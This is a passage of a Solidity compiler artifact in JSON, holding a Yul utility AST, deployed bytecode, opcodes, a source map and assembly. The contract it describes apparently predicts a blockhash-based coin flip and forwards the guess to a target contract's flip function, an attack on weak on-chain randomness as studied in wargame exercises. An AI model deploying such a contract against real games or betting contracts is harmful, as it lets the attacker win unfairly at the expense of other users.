																	"src": "1556:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1556:88:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1556:88:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1660:1:1",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1663:4:1",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1653:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1653:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1653:15:1"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1684:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1687:4:1",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "1677:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1677:15:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1677:15:1"
														}
													]
												},
												"name": "panic_error_0x12",
												"nodeType": "YulFunctionDefinition",
												"src": "1518:180:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1744:76:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1798:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1807:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1810:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "1800:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1800:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1800:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1767:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "1789:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nodeType": "YulIdentifier",
																					"src": "1774:14:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1774:21:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "1764:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1764:32:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1757:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1757:40:1"
															},
															"nodeType": "YulIf",
															"src": "1754:2:1"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1737:5:1",
														"type": ""
													}
												],
												"src": "1704:116:1"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_bool_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506004361061002b5760003560e01c8063cde4efa914610030575b600080fd5b61003861003a565b005b600060014361004991906101d7565b4060001c905080600154141561005e57600080fd5b8060018190555060006002548261007591906101a6565b905060006001821461008857600061008b565b60015b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f67826040518263ffffffff1660e01b81526004016100e6919061018b565b602060405180830381600087803b15801561010057600080fd5b505af1158015610114573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101389190610153565b50505050565b60008151905061014d8161027f565b92915050565b60006020828403121561016557600080fd5b60006101738482850161013e565b91505092915050565b6101858161020b565b82525050565b60006020820190506101a0600083018461017c565b92915050565b60006101b182610217565b91506101bc83610217565b9250826101cc576101cb610250565b5b828204905092915050565b60006101e282610217565b91506101ed83610217565b925082821015610200576101ff610221565b5b828203905092915050565b60008115159050919050565b6000819050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6102888161020b565b811461029357600080fd5b5056fea26469706673582212205eb699bca14c130a68669dc753d1d2205415858a009b8a27ce366bc7b8564a1f64736f6c63430008000033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2B JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xCDE4EFA9 EQ PUSH2 0x30 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x38 PUSH2 0x3A JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0x1 NUMBER PUSH2 0x49 SWAP2 SWAP1 PUSH2 0x1D7 JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0x5E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x2 SLOAD DUP3 PUSH2 0x75 SWAP2 SWAP1 PUSH2 0x1A6 JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0x88 JUMPI PUSH1 0x0 PUSH2 0x8B JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xE6 SWAP2 SWAP1 PUSH2 0x18B JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x100 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x114 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x138 SWAP2 SWAP1 PUSH2 0x153 JUMP JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x14D DUP2 PUSH2 0x27F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x165 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x173 DUP5 DUP3 DUP6 ADD PUSH2 0x13E JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x185 DUP2 PUSH2 0x20B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1A0 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x17C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1B1 DUP3 PUSH2 0x217 JUMP JUMPDEST SWAP2 POP PUSH2 0x1BC DUP4 PUSH2 0x217 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x1CC JUMPI PUSH2 0x1CB PUSH2 0x250 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1E2 DUP3 PUSH2 0x217 JUMP JUMPDEST SWAP2 POP PUSH2 0x1ED DUP4 PUSH2 0x217 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x200 JUMPI PUSH2 0x1FF PUSH2 0x221 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0x288 DUP2 PUSH2 0x20B JUMP JUMPDEST DUP2 EQ PUSH2 0x293 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x5E 0xB6 SWAP10 0xBC LOG1 0x4C SGT EXP PUSH9 0x669DC753D1D2205415 DUP6 DUP11 STOP SWAP12 DUP11 0x27 0xCE CALLDATASIZE PUSH12 0xC7B8564A1F64736F6C634300 ADDMOD STOP STOP CALLER ",
							"sourceMap": "830:613:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1102:338;;;:::i;:::-;;;1136:18;1190:1;1175:12;:16;;;;:::i;:::-;1165:27;1157:36;;1136:57;;1221:10;1209:8;;:22;1206:61;;;1247:8;;;1206:61;1290:10;1279:8;:21;;;;1311:16;1343:6;;1330:10;:19;;;;:::i;:::-;1311:38;;1360:9;1384:1;1372:8;:13;:28;;1395:5;1372:28;;;1388:4;1372:28;1360:40;;1413:8;;;;;;;;;;:13;;;1427:4;1413:19;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;1102:338;;;:::o;7:137:1:-;;92:6;86:13;77:22;;108:30;132:5;108:30;:::i;:::-;67:77;;;;:::o;150:278::-;;266:2;254:9;245:7;241:23;237:32;234:2;;;282:1;279;272:12;234:2;325:1;350:61;403:7;394:6;383:9;379:22;350:61;:::i;:::-;340:71;;296:125;224:204;;;;:::o;434:109::-;515:21;530:5;515:21;:::i;:::-;510:3;503:34;493:50;;:::o;549:210::-;;674:2;663:9;659:18;651:26;;687:65;749:1;738:9;734:17;725:6;687:65;:::i;:::-;641:118;;;;:::o;765:185::-;;822:20;840:1;822:20;:::i;:::-;817:25;;856:20;874:1;856:20;:::i;:::-;851:25;;895:1;885:2;;900:18;;:::i;:::-;885:2;942:1;939;935:9;930:14;;807:143;;;;:::o;956:191::-;;1016:20;1034:1;1016:20;:::i;:::-;1011:25;;1050:20;1068:1;1050:20;:::i;:::-;1045:25;;1089:1;1086;1083:8;1080:2;;;1094:18;;:::i;:::-;1080:2;1139:1;1136;1132:9;1124:17;;1001:146;;;;:::o;1153:90::-;;1230:5;1223:13;1216:21;1205:32;;1195:48;;;:::o;1249:77::-;;1315:5;1304:16;;1294:32;;;:::o;1332:180::-;1380:77;1377:1;1370:88;1477:4;1474:1;1467:15;1501:4;1498:1;1491:15;1518:180;1566:77;1563:1;1556:88;1663:4;1660:1;1653:15;1687:4;1684:1;1677:15;1704:116;1774:21;1789:5;1774:21;:::i;:::-;1767:5;1764:32;1754:2;;1810:1;1807;1800:12;1754:2;1744:76;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "143200",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"flip()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 830,
									"end": 1443,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 830,
									"end": 1443,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 830,
									"end": 1443,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 922,
									"end": 999,
									"name": "PUSH",
									"source": 0,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 905,
									"end": 999,
									"name": "PUSH",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 905,
									"end": 999,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "3"
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "JUMP",
									"source": 0,
									"value": "[in]"
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "tag",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 1069,
									"end": 1077,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1049,
									"end": 1057,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 1049,
									"end": 1057,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 1049,
									"end": 1078,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 1008,
									"end": 1090,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 830,
									"end": 1443,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 830,
									"end": 1443,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 7,
									"end": 150,
									"name": "tag",
									"source": 1,
									"value": "8"
								},
								{
									"begin": 7,
									"end": 150,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 7,
									"end": 150,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 95,
									"end": 101,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 89,
									"end": 102,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 80,
									"end": 102,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 80,
									"end": 102,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 111,
									"end": 144,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 138,
									"end": 143,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 111,
									"end": 144,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "11"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "tag",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 70,
									"end": 150,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 70,
									"end": 150,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 70,
									"end": 150,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 70,
									"end": 150,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 70,
									"end": 150,
									"name": "JUMP",
									"source": 1,
									"value": "[out]"
								},
								{
									"begin": 156,
									"end": 440,
									"name": "tag",
									"source": 1,
									"value": "3"
								},
								{
									"begin": 156,
									"end": 440,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 156,
									"end": 440,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 275,
									"end": 277,
									"name": "PUSH",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 263,
									"end": 272,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 254,
									"end": 261,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 250,
									"end": 273,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 246,
									"end": 278,
									"name": "SLT",
									"source": 1
								},
								{
									"begin": 243,
									"end": 245,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 243,
									"end": 245,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 243,
									"end": 245,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 291,
									"end": 292,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 288,
									"end": 289,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 281,
									"end": 293,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 243,
									"end": 245,
									"name": "tag",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 243,
									"end": 245,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 334,
									"end": 335,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "14"
								},
								{
									"begin": 415,
									"end": 422,
									"name": "DUP5",
									"source": 1
								},
								{
									"begin": 406,
									"end": 412,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 395,
									"end": 404,
									"name": "DUP6",
									"source": 1
								},
								{
									"begin": 391,
									"end": 413,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 359,
									"end": 423,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "8"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "tag",
									"source": 1,
									"value": "14"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 349,
									"end": 423,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 349,
									"end": 423,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 305,
									"end": 433,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 233,
									"end": 440,
									"name": "SWAP3",
									"source": 1
								},
								{
									"begin": 233,
									"end": 440,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 233,
									"end": 440,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 233,
									"end": 440,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 233,
									"end": 440,
									"name": "JUMP",
									"source": 1,
									"value": "[out]"
								},
								{
									"begin": 446,
									"end": 542,
									"name": "tag",
									"source": 1,
									"value": "15"
								},
								{
									"begin": 446,
									"end": 542,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 446,
									"end": 542,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 512,
									"end": 536,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "17"
								},
								{
									"begin": 530,
									"end": 535,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 512,
									"end": 536,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "18"
								},
								{
									"begin": 512,
									"end": 536,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 512,
									"end": 536,
									"name": "tag",
									"source": 1,
									"value": "17"
								},
								{
									"begin": 512,
									"end": 536,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 501,
									"end": 536,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 501,
									"end": 536,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 491,
									"end": 542,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 491,
									"end": 542,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 491,
									"end": 542,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 491,
									"end": 542,
									"name": "JUMP",
									"source": 1,
									"value": "[out]"
								},
								{
									"begin": 548,
									"end": 674,
									"name": "tag",
									"source": 1,
									"value": "18"
								},
								{
									"begin": 548,
									"end": 674,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 548,
									"end": 674,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 625,
									"end": 667,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 618,
									"end": 623,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 614,
									"end": 668,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 603,
									"end": 668,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 603,
									"end": 668,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 593,
									"end": 674,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 593,
									"end": 674,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 593,
									"end": 674,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 593,
									"end": 674,
									"name": "JUMP",
									"source": 1,
									"value": "[out]"
								},
								{
									"begin": 680,
									"end": 802,
									"name": "tag",
									"source": 1,
									"value": "11"
								},
								{
									"begin": 680,
									"end": 802,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 753,
									"end": 777,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "21"
								},
								{
									"begin": 771,
									"end": 776,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 753,
									"end": 777,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "15"
								},
								{
									"begin": 753,
									"end": 777,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 753,
									"end": 777,
									"name": "tag",
									"source": 1,
									"value": "21"
								},
								{
									"begin": 753,
									"end": 777,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 746,
									"end": 751,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 743,
									"end": 778,
									"name": "EQ",
									"source": 1
								},
								{
									"begin": 733,
									"end": 735,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "22"
								},
								{
									"begin": 733,
									"end": 735,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 792,
									"end": 793,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 789,
									"end": 790,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 782,
									"end": 794,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 733,
									"end": 735,
									"name": "tag",
									"source": 1,
									"value": "22"
								},
								{
									"begin": 733,
									"end": 735,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 723,
									"end": 802,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 723,
									"end": 802,
									"name": "JUMP",
									"source": 1,
									"value": "[out]"
								},
								{
									"begin": 830,
									"end": 1443,
									"name": "tag",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 830,
									"end": 1443,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 830,
									"end": 1443,
									"name": "PUSH #[$]",
									"source": 0,
